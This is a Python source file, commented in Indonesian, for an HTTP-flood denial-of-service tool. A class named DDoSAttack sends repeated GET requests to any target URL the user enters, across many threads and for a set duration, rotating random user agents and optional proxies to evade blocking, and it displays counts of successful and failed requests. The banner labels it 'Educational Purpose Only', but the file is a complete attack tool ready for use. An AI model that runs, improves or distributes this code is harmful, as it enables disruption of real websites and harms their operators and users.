import os
import time
import ctypes
import random
import asyncio
import aiohttp
import socket
from datetime import datetime
from threading import Thread, Lock
from fake_useragent import UserAgent
from colorama import Fore, Style, Back, init

# Inisialisasi colorama
init()

class DDoSAttack:
    def __init__(self):
        self.success = 0
        self.failures = 0
        self.lock = Lock()
        self.ua = UserAgent()

    def display_status(self):
        """
        Menampilkan status serangan di terminal
        """
        if os.name == 'nt':  # Windows
            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 - Success: {self.success} | Failures: {self.failures}")
        print(f"[STATUS] Sent: {self.success} | Failures: {self.failures}")

    async def send_request(self, target_url, proxy=None):
        """
        Mengirimkan permintaan HTTP GET ke target.
        """
        headers = {'User-Agent': self.ua.random}
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(target_url, headers=headers, proxy=proxy) as response:
                    if response.status == 200:
                        with self.lock:
                            self.success += 1
                            self.display_status()
                    else:
                        raise Exception("Failed request")
            except:
                with self.lock:
                    self.failures += 1
                    self.display_status()

    def start_attack(self, target_url, duration, threads, use_proxy=False):
        """
        Memulai serangan ke target.
        """
        proxies = []  # Tambahkan daftar proxy di sini jika diperlukan

        async def attack_task():
            """
            Fungsi utama untuk menjalankan serangan.
            """
            end_time = time.time() + duration
            while time.time() < end_time:
                proxy = random.choice(proxies) if use_proxy and proxies else None
                await self.send_request(target_url, proxy)

        print(Fore.YELLOW + "[INFO] Attack is starting..." + Style.RESET_ALL)

        # Meluncurkan serangan dengan threading
        for _ in range(threads):
            Thread(target=asyncio.run, args=(attack_task(),)).start()

# Penggunaan
if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + "DDoS Test Tool (Educational Purpose Only)" + Style.RESET_ALL)

    target = input(Fore.YELLOW + "Enter target URL or IP: " + Fore.GREEN)
    duration = int(input(Fore.YELLOW + "Enter attack duration (in seconds): " + Fore.GREEN))
    threads = int(input(Fore.YELLOW + "Enter number of threads: " + Fore.GREEN))
    use_proxy = input(Fore.YELLOW + "Use proxies? (y/n): " + Fore.GREEN).strip().lower() == 'y'

    if target.startswith("http://") or target.startswith("https://"):
        target_url = target
    else:
        target_url = f"http://{target}"

    ddos = DDoSAttack()
    ddos.start_attack(target_url, duration, threads, use_proxy)

